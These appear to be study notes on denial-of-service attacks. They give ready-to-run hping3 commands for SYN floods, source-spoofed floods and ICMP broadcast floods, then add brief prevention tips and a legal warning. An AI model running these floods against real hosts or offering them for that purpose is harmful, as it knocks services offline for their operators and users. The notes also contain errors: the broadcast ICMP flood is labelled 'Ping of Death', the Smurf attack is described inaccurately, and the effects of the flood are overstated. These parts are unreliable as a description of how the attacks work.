### **DoS (Denial of Service)** and **DDoS (Distributed Denial of Service)**

- **DoS (Denial of Service)**: A type of attack where the attacker overwhelms a system or network with traffic, making it unable to function properly. This is typically done by sending a large number of requests to a target server, consuming all its resources.
- **DDoS (Distributed Denial of Service)**: A more advanced version of DoS where the attack comes from multiple sources (often compromised machines), making it harder to stop.

### **Common DoS and DDoS Commands** with **hping3**

- **Check Port Range**:
    
    ```bash
    sudo hping3 -S --scan <port_range> <target_ip>
    ```
    
    - This checks for open ports in a given range.
- **Check Specific Port**:
    
    ```bash
    sudo hping3 -S -p 80 <target_ip>
    ```
    
    - This checks if a specific port (like port 80) is open.
- **Performing a DoS Attack (Flooding with SYN Packets)**:
    
    ```bash
    sudo hping3 -S -p 80 <target_ip> --flood
    ```
    
    - Floods the target with SYN packets.
- **SYN Flood with IP Spoofing**:
    
    ```bash
    sudo hping3 -S -p 80 <target_ip> -a <fake_source_ip> --flood
    ```
    
    - Spoofs the source IP to flood the target. This is an **IP Spoofing** or **Spoofing attack**.

### **Smurf Attack (ICMP-based DoS Attack)**

- **What is it?**: A **Smurf attack** involves using ICMP packets (ping requests) to flood a target network by spoofing the source IP.
- **Commands**:
    - **Flood Target with ICMP Packets**:
        
        ```bash
        sudo hping3 --icmp <target_ip> --rand-source --flood
        ```
        
        - Floods the target IP using random source IPs (IP Spoofing).
    - **Ping of Death** (ICMP flooding):
        
        ```bash
        sudo hping3 --icmp <broadcast_address> --rand-source --flood
        ```
        
        - Floods all machines in the network using a **broadcast address** (e.g., `192.168.0.255`), causing all devices to lose internet access.

### **Preventive Measures for DoS Attacks**

- **Block Ports**: Block the attacked port on the firewall to prevent traffic from reaching that port.
- **Intrusion Detection Systems (IDS)**: Use IDS to detect and prevent malicious traffic.
- **Rate Limiting**: Implement rate limiting on web servers to prevent abuse.

### **Land Attack** (A Type of DoS)

- **What is it?**: In a **Land Attack**, the attacker spoofs the source IP to be the same as the targetâ€™s destination IP. The server then tries to respond to itself, causing confusion and possibly crashing the system.

### **Important Reminder**

- **Legal Warning**: It is illegal to perform DoS or DDoS attacks on live websites without authorization. These activities can lead to serious consequences.
